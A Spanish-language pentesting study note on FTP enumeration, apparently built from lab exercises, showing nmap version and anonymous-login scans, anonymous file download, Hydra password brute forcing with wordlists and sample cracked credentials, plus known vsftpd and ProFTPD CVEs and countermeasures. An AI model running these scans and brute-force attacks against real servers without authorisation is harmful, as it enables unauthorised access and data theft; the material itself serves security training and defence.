---
title: Enumeración FTP (File Transfer Protocol)
slug: enumeracion-ftp
aliases: [Enumeración FTP (File Transfer Protocol)]
fase: [Enumeración]
plataforma: Multi
dificultad: Básica
mitre: [T1046, T1110.001]
related: []
learning_refs: []
---

# Enumeración FTP (File Transfer Protocol)

## Descripción
FTP (File Transfer Protocol) es un protocolo de transferencia de archivos que opera en los puertos 21/tcp (control) y 20/tcp (datos en modo activo). Transmite credenciales y datos en texto plano, siendo vulnerable a sniffing. La enumeración FTP incluye: identificar la versión del servidor (vsftpd, ProFTPD, Pure-FTPd), detectar si permite acceso anonimo, y realizar ataques de fuerza bruta. El acceso anonimo en servidores mal configurados puede exponer archivos sensibles sin necesidad de credenciales.

## Herramientas
- **nmap** (`ftp-anon`) — detección de login anonimo y listado de archivos
- **ftp** — cliente FTP nativo para acceso y descarga de archivos
- **Hydra** — fuerza bruta de credenciales FTP

## Comandos / Ejemplos

### Detección de versión y acceso anonimo
```bash
# Deteccion de version del servidor FTP
nmap 192.234.83.3
nmap -p21 -O -sV 192.160.149.3
# Resultado: "21/tcp open ftp ProFTPD 1.3.5a"
#         o: "21/tcp open ftp vsftpd 3.0.3"

# Detectar login anonimo con nmap
nmap -sV 192.234.83.3 --script ftp-anon
# Resultado:
# 21/tcp open  ftp     vsftpd 3.0.3
# | ftp-anon: Anonymous FTP login allowed (FTP code 230)
# | -rw-r--r--  1 ftp ftp  33 Dec 18 2018 flag
# |_drwxr-xr-x  2 ftp ftp 4096 Dec 18 2018 pub

# Scripts NSE adicionales
nmap -p21 --script ftp-brute,ftp-anon,ftp-bounce TARGET
```

### Acceso anonimo FTP
```bash
ftp 192.234.83.3
# Username: anonymous
# Password: (vacia o cualquier email como anonymous@test.com)

ftp> ls                # listar archivos
ftp> cd pub            # cambiar directorio
ftp> get flag          # descargar archivo
ftp> mget *            # descargar todos los archivos
ftp> exit
```

### Fuerza bruta con Hydra
```bash
# Lista de usuarios + lista de contrasenas
hydra -L /usr/share/wordlists/metasploit/common_users.txt \
  -P /usr/share/wordlists/metasploit/unix_passwords.txt \
  192.160.149.3 ftp
# Resultado tipico:
# sysadmin:654321, rooty:qwerty, demo:butterfly, auditor:chocolate

# Usuario fijo
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ftp
```

### Acceso autenticado
```bash
ftp 192.160.149.3
# Username: auditor
# Password: chocolate

ftp> ls
ftp> get secret.txt
ftp> bye
```

**Versiones comunes y vulnerabilidades conocidas:**
| Versión | CVE notable |
|---------|-------------|
| vsftpd 2.3.4 | CVE-2011-2523 (backdoor en versión troyanizada) |
| ProFTPD 1.3.5 | CVE-2015-3306 (mod_copy RCE sin autenticación) |
| ProFTPD 1.3.5a | Parchada respecto a 1.3.5 |

## Contramedidas
- Deshabilitar FTP anonimo a menos que sea absolutamente necesario
- Migrar de FTP a SFTP (SSH File Transfer Protocol) o FTPS (FTP sobre TLS)
- Implementar rate limiting para bloquear fuerza bruta
- Restringir el acceso FTP por IP mediante firewall o configuración del servidor
- Usar jail chroot para confinar a los usuarios FTP en su directorio home
- Monitorear logs de FTP para detectar intentos de acceso fallidos

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1110.001: Brute Force: Password Guessing. https://attack.mitre.org/techniques/T1110/001/
